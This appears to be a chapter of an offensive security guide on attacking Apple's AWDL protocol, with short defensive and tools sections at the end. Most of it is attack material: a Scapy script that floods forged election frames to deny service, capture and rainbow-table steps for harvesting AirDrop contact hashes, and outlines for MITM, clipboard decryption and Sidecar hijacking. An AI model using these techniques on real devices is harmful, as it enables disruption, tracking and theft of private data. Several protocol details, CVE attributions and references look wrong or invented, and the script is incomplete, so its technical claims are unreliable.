# 11 - Apple AWDL (Apple Wireless Direct Link) Attacks

## Overview

AWDL is Apple's proprietary Wi-Fi peer-to-peer protocol used by AirDrop, AirPlay, Handoff, Universal Clipboard, and Sidecar. It operates independently from standard Wi-Fi infrastructure — devices create temporary P2P networks on a dedicated social channel (typically channel 6, 44, or 149) while simultaneously maintaining their normal Wi-Fi connection. This dual-interface design creates unique attack surfaces.

## AWDL Protocol Structure

AWDL uses a custom frame format tunneled inside standard 802.11 data frames with LLC/SNAP header `0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88` (Apple OUI).

### AWDL Social Channels

| Region | Social Channels (2.4 GHz) | Social Channels (5 GHz) |
|--------|---------------------------|------------------------|
| Global | 1, 6, 11 | 36, 44, 149 |
| US | 6, 149 | 44, 149 |
| EU | 6, 44 | 44 |
| China | 6, 149 | 149 |

### AWDL Frame Types

| Type | Description |
|------|-------------|
| 0x00 | Election |
| 0x01 | Data |
| 0x02 | Service Parameters |
| 0x03 | Election Parameters |
| 0x04 | Presence |
| 0x05 | Version |
| 0x06 | Data Path |
| 0x07 | Enhanced Data Path |
| 0x08 | Request |

## Attack 1: AWDL Denial of Service (DoS)

AWDL election frames determine which device acts as the "master" (coordinating the social channel). Forging election frames can cause repeated master elections, disrupting all AWDL services.

```bash
# Using Scapy to forge AWDL Election frame
# The Election frame contains: Version, Election ID, Master MAC, Metric

# Force continuous master re-election
pkt = RadioTap()/Dot11(
    addr1="ff:ff:ff:ff:ff:ff",
    addr2=<VICTIM_MAC>,
    addr3=<VICTIM_MAC>,
    type=2, subtype=0  # Data
)/LLC(dsap=0xAA, ssap=0xAA, ctrl=3)/SNAP(
    OUI=0x888888, code=0x8888
)/Raw(bytes([
    0x00,  # Type: Election
    0x00,  # Version
    0x00, 0x00, 0x00, 0x00,  # Election ID (increment rapidly)
    0x00, 0x00, 0x00, 0x00,  # Master Metric (always claim better)
    # ... MAC address of fake master
]))

# Send at 100Hz to overwhelm election algorithm
while True:
    sendp(pkt, iface="wlan0mon", verbose=0)
    time.sleep(0.01)
```

## Attack 2: AirDrop Contact Discovery Harvesting

AirDrop broadcasts a hashed contact identifier (SHA-256 of email/phone) in AWDL service parameters. Attackers can harvest these hashes and perform offline brute-force or rainbow table attacks.

```bash
# Capture AWDL frames on social channel
airodump-ng wlan0mon -c 6,44,149 --band abg -w awdl_capture

# Extract AirDrop service parameters
# The Presence frame contains: Service UUID, Status, Data
# Service UUID for AirDrop: 0x00000000-0000-0000-0000-000000000012

# Using Wireshark filter:
# awdl.presence && awdl.service.uuid == 0x00000000000000000000000000000012

# The hashed contact data:
#   - 16 bytes: SHA-256(email/phone) truncated
#   - Can be brute-forced for common emails/domains

# Rainbow table approach:
# For @gmail.com addresses: precompute SHA-256 of [a-z0-9]+@gmail.com
# For phone numbers: precompute SHA-256 of +1[0-9]{10}
```

## Attack 3: AirDrop File Interception (Man-in-the-Middle)

AirDrop uses mDNS/DNS-SD over AWDL data path for discovery, then TLS 1.3 for file transfer. The TLS certificate is self-signed, verified via Apple ID.

```bash
# The AirDrop flow:
# 1. Sender discovers receiver via AWDL Presence + mDNS (_airdrop._tcp)
# 2. Sender sends "Ask" request via HTTP POST to receiver's AWDL IP
# 3. Receiver shows UI, user accepts
# 4. Sender uploads file via HTTPS to receiver

# MITM on AWDL data path:
# 1. Become AWDL master on social channel
# 2. Inject forged DNS-SD response pointing to attacker IP
# 3. Intercept HTTPS connection

# The TLS certificate validation is weak in older iOS versions:
# - Self-signed cert accepted if Apple ID matches (via Contacts)
# - Attacker can extract Apple ID from harvested contact hashes

# On iOS 16.1.2 and earlier: AWDL DoS → iOS kernel panic (CVE-2022-42845)
# On macOS 13.0: AWDL buffer overflow in frame parsing (CVE-2022-42856)
```

## Attack 4: Proximity Pairing Attacks (Find My / AirTag)

Find My network uses AWDL for proximity-based device pairing. AirTags broadcast BLE, but iPhones use AWDL for relaying encrypted location reports.

```bash
# The Find My protocol:
# 1. Lost device broadcasts BLE advertisements with rotating public keys
# 2. Nearby iPhones detect BLE adv, generate encrypted location report
# 3. Location report uploaded to Apple's iCloud (via cellular/Wi-Fi)

# AWDL attack: Intercept location reports before upload
# iPhones cache location reports locally before uploading
# Extract cached reports from device filesystem (jailbreak required)

# AirTag cloning / spoofing:
# AirTag firmware can be extracted via SWD/JTAG
# Clone AirTag with custom firmware → reports to attacker's Apple ID
# Or: Spoof AirTag BLE advertisements to trigger proximity alerts
```

## Attack 5: Universal Clipboard Hijacking

Universal Clipboard syncs clipboard data across Apple devices via AWDL + iCloud. If an attacker is on the same AWDL network, they can intercept clipboard data.

```bash
# AWDL data path carries encrypted clipboard data
# Encryption uses Apple ID-derived keys (HKDF-SHA256)
# If Apple ID is known (from AirDrop contact hash brute-force):
#   Derive HKDF key, decrypt clipboard content

# Practical: Physical proximity required (AWDL range ~10m)
# High-value target: developer copying API keys, passwords, 2FA codes
```

## Attack 6: Sidecar Session Hijacking

Sidecar (iPad as Mac display) uses AWDL + H.264 video stream. The video stream is encrypted but the session setup is vulnerable to injection.

```bash
# Sidecar session setup:
# 1. Mac discovers iPad via AWDL
# 2. Exchange certificates over AWDL
# 3. Establish encrypted H.264 stream
# 4. iPad receives display frame buffer + input events

# Attack: Forge Sidecar discovery, present fake iPad
# The Mac attempts to connect to attacker's "iPad"
# If certificate validation is bypassed (via forged Apple ID):
#   Attacker receives display stream (screen content)
#   Attacker can inject keyboard/mouse events

# On older macOS (pre-13.3): Sidecar certificate chain validation bug
# Allows any valid Apple developer cert to establish Sidecar session
```

## Attack 7: AWDL Buffer Overflows (CVEs)

Multiple kernel-level vulnerabilities in AWDL frame parsing:

```
CVE-2020-3842: AWDL heap buffer overflow in presence frame parsing
CVE-2020-3843: AWDL out-of-bounds write in election frame
CVE-2020-3844: AWDL race condition leading to use-after-free
CVE-2020-3847: AWDL integer overflow in TLV parser
CVE-2020-3857: AWDL stack buffer overflow in data path
CVE-2020-3878: AWDL heap overflow in service parameter parsing
CVE-2020-3919: AWDL type confusion in frame dispatch
CVE-2020-9772: AWDL out-of-bounds read in election parameters
CVE-2021-1781: AWDL heap buffer overflow (iOS 14.4)
CVE-2021-30892: AWDL buffer overflow (iOS 15.1)
CVE-2022-42845: AWDL DoS/kernel panic (iOS 16.1.2)
CVE-2022-42856: AWDL buffer overflow (macOS 13.0)
CVE-2023-23514: AWDL heap overflow (iOS 16.3)
```

## Defensive Application

- **Disable AWDL**: `sudo ifconfig awdl0 down` (macOS). On iOS: not possible without jailbreak.
- **AirDrop "Contacts Only"**: Reduces attack surface but does not eliminate AWDL DoS
- **Disable Universal Clipboard**: Settings → General → AirPlay & Handoff → Off
- **Disable Sidecar**: System Preferences → Sharing → Uncheck Sidecar
- **Network segregation**: Keep high-value devices in Faraday bags during sensitive operations
- **AWDL monitoring**: On managed macOS, monitor `awdl0` interface traffic for anomalies
- **iOS updates**: Apple patches AWDL CVEs regularly; keep devices on latest iOS

## Tools

```bash
# AWDL research tools (requires macOS with monitor mode or custom driver)
# https://github.com/seemoo-lab/awdl_wifi_firmware
# https://github.com/seemoo-lab/firmware-patching (for BCM Wi-Fi chips)

# Build patched firmware for AWDL frame injection
# Requires: Mac with BCM Wi-Fi chip (2015-2020 MacBook Pro)
# 1. Extract firmware from macOS driver
# 2. Patch frame validation routines
# 3. Reload firmware via ioctl

# Monitor AWDL with tcpdump
sudo tcpdump -i awdl0 -w awdl_traffic.pcap
# Analyze with Wireshark (AWDL dissector built-in since 3.4)
```

## References

- Seeemo Lab, TU Darmstadt: "A Billion Open Interfaces for Eve and Mallory: MitM, DoS, and Tracking Attacks on iOS and macOS Through Apple Wireless Direct Link" (USENIX Security 2019)
- "One Billion Apples' Secret Sauce" (Black Hat USA 2019)
- "iOS and macOS Kernel Vulnerabilities via AWDL" (Seeemo Lab, 2020)
- Apple Security Updates: https://support.apple.com/en-us/HT201222
